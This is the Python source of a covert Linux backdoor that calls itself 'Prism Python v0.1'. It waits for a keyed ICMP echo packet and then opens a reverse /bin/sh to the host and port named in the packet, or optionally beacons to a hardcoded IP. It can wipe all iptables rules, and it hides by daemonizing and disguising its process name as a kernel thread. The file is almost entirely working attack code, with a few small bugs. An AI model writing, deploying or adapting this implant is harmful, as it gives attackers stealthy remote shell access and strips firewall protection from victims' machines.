#!/usr/bin/python
import signal, sys, time, os, socket, subprocess, struct
MOTD = b"Prism Python v0.1 started\n\n#"
SHELL = '/bin/sh'
ICMP_PACKET_SIZE = 1024
ICMP_ECHO = 8

DETACH = True
IPTABLES = False
STATIC = False
DEBUG = False
RENAME = True
ICMP_KEY = "stella2ma2"
REVERSE_HOST = '10.239.44.81'
REVERSE_PORT = '19999'
PROCESS_NAME = "[mmkproc]"

def flush_iptables():
    os.system("iptables-save > /tmp/ipt 2> /dev/null")
    os.system("iptables -X 2> /dev/null");
    os.system("iptables -F 2> /dev/null");
    os.system("iptables -t nat -F 2> /dev/null");
    os.system("iptables -t nat -X 2> /dev/null");
    os.system("iptables -t mangle -F 2> /dev/null");
    os.system("iptables -t mangle -X 2> /dev/null");
    os.system("iptables -P INPUT ACCEPT 2> /dev/null");
    os.system("iptables -P FORWARD ACCEPT 2> /dev/null");
    os.system("iptables -P OUTPUT ACCEPT 2> /dev/null");

def start_reverse_shell(host, port):
    if IPTABLES:
        flush_iptables()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((host, int(port)))
    except:
        return
    sock.send(MOTD)
    os.dup2(sock.fileno(), 0)
    os.dup2(sock.fileno(), 1)
    os.dup2(sock.fileno(), 2)
    os.execl(SHELL, '[md/4]')
    sock.close()
    return

def icmp_listen():
    icmp_proto = socket.getprotobyname("icmp")
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp_proto)
    while(1):
        msg, _ = sock.recvfrom(ICMP_PACKET_SIZE);
        if len(msg) > 0:
            header = struct.unpack("bbHHh", msg[20:28])
            data = msg[28:]
            if (header[0] == ICMP_ECHO) and (ICMP_KEY == data[0:len(ICMP_KEY)]):
                _, ip, port, _ = data.split()
                if (os.fork() == 0):
                    if IPTABLES:
                        flush_iptables()
                    start_reverse_shell(ip, port)
                    sys.exit(0)
    return

def rename():
    from ctypes import cdll, byref, create_string_buffer
    libc = cdll.LoadLibrary('libc.so.6')
    buff = create_string_buffer(len(PROCESS_NAME) + 1)
    buff.value = PROCESS_NAME
    libc.prctl(15, byref(buff), 0, 0, 0)


def hide():
    signal.signal(signal.SIGCHLD, signal.SIG_IGN)
    f = open(os.devnull, 'w')
    if not DEBUG:
        sys.stdout = f
        sys.stderr = f
        sys.stdin  = f
    if DETACH:
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError as e:
            sys.exit(1)
        os.setsid()
        os.chdir('/')
        os.umask(0)
    if STATIC:        
        while(1):
            if (os.fork() == 0):
                start_reverse_shell(REVERSE_HOST, REVERSE_PORT)
                sys.exit(0)
            time.sleep(10 + random.random(5, 15))
    else:
        if (os.getgid() != 0):
            print("I am not root :(")
            sys.exit(1)
        icmp_listen()
    return

if __name__ == '__main__':
    if RENAME:
        rename()
    hide()
